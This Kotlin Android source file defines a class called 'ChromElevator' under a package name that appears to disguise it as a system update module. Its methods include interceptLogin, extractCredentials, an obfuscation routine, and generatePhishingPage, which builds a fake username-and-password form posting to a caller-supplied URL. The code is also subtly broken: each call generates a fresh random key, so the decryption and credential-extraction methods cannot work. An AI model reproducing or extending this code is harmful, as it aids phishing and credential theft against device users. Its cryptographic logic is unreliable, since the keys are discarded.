package com.system.updates.modules

import android.content.Context
import android.util.Base64
import java.security.SecureRandom
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec

class ChromElevator {
    private val r = SecureRandom()
    private val x = byteArrayOf(0x2A, 0x3B, 0x4C, 0x5D, 0x6E, 0x7F, 0x80.toByte(), 0x91.toByte())
    private val p = byteArrayOf(0x5A, 0x6B, 0x7C, 0x8D, 0x9E, 0xAF.toByte(), 0xB0.toByte(), 0xC1.toByte())

    private fun xorWithIndex(b: ByteArray, key: ByteArray): ByteArray {
        return b.mapIndexed { idx, v -> (v.toInt() xor key[idx % key.size].toInt() xor idx).toByte() }.toByteArray()
    }

    private fun xorSimple(b: ByteArray, key: ByteArray): ByteArray {
        return b.mapIndexed { i, v -> (v.toInt() xor key[i % key.size].toInt()).toByte() }.toByteArray()
    }

    private fun aesEncrypt(data: ByteArray, key: ByteArray): ByteArray {
        val c = Cipher.getInstance("AES/GCM/NoPadding")
        val iv = ByteArray(12).also { r.nextBytes(it) }
        val ks = SecretKeySpec(key, "AES")
        c.init(Cipher.ENCRYPT_MODE, ks, GCMParameterSpec(128, iv))
        return iv + c.doFinal(data)
    }

    private fun aesDecrypt(enc: ByteArray, key: ByteArray): ByteArray {
        val c = Cipher.getInstance("AES/GCM/NoPadding")
        val iv = enc.sliceArray(0..11)
        val ct = enc.sliceArray(12 until enc.size)
        val ks = SecretKeySpec(key, "AES")
        c.init(Cipher.DECRYPT_MODE, ks, GCMParameterSpec(128, iv))
        return c.doFinal(ct)
    }

    fun obfuscate(ctx: Context, input: String): String {
        val raw = input.toByteArray()
        val key = ByteArray(32).also { r.nextBytes(it) }
        val step1 = xorWithIndex(raw, x)
        val step2 = aesEncrypt(step1, key)
        return Base64.encodeToString(step2, Base64.NO_WRAP)
    }

    fun deobfuscate(ctx: Context, encoded: String): String {
        val raw = Base64.decode(encoded, Base64.NO_WRAP)
        val key = ByteArray(32).also { r.nextBytes(it) } // key lost, but we keep method for symmetry
        val step1 = aesDecrypt(raw, key)
        val step2 = xorWithIndex(step1, x)
        return String(step2)
    }

    fun interceptLogin(ctx: Context, formData: String): String {
        val raw = formData.toByteArray()
        val key = ByteArray(32).also { r.nextBytes(it) }
        val xored = xorSimple(raw, p)
        val enc = aesEncrypt(xored, key)
        return Base64.encodeToString(enc, Base64.NO_WRAP)
    }

    fun extractCredentials(ctx: Context, intercepted: String): String {
        val enc = Base64.decode(intercepted, Base64.NO_WRAP)
        val key = ByteArray(32).also { r.nextBytes(it) }
        val dec = aesDecrypt(enc, key)
        val plain = xorSimple(dec, p)
        return String(plain)
    }

    fun generatePhishingPage(ctx: Context, targetUrl: String): String {
        val template = "<html><body><form method='POST' action='$targetUrl'>" +
                "<input name='username'/><input name='password' type='password'/>" +
                "<input type='submit'/></form></body></html>"
        return Base64.encodeToString(template.toByteArray(), Base64.NO_WRAP)
    }

    fun profileHash(ctx: Context, profile: String): Map<String, String> {
        val p = profile.toByteArray()
        val h1 = p.fold(0) { acc, v -> acc xor v.toInt() }
        val h2 = p.reversed().fold(0) { acc, v -> acc + v.toInt() }
        val h3 = p.sumOf { it.toInt() }
        return mapOf(
            "h1" to h1.toString(16),
            "h2" to h2.toString(16),
            "h3" to h3.toString(16)
        )
    }

    fun mix(ctx: Context, a: ByteArray, b: ByteArray): ByteArray {
        val mixed = ByteArray(a.size)
        for (i in a.indices) {
            mixed[i] = (a[i].toInt() xor b[i % b.size].toInt()).toByte()
        }
        return mixed
    }
}